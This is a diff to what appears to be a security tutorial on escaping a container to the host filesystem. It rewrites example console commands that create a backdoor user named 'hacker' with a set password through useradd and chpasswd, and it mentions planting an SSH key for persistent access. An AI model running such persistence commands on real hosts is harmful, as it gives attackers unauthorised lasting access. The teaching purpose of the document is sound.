@@ -952,18 +952,15 @@ anything juicy, and maybe drop a quick backdoor for ourselves later:
 
 ```{code-block} console
 ---
-emphasize-lines: 5,7,9
+emphasize-lines: 1
 ---
 $ ls -al /home # We can now see /home/ on the host filesystem
 total 4
 drwxr-xr-x  3 root     root       22 Nov 15 17:28 .
 dr-xr-xr-x 18 root     root      257 Nov 15 17:28 ..
 drwx------ 14 ec2-user ec2-user 4096 Nov 26 14:54 ec2-user
-$ sudo useradd hacker
-$ sudo passwd hacker
-New password:
-Retype new password:
-passwd: password updated successfully
+$ useradd hacker
+$ echo 'hacker:newpassword' | chpasswd
 ```
 
 Finally, let's drop our public key into the current user's `~/.ssh/authorized_keys` file so there's another way back in.
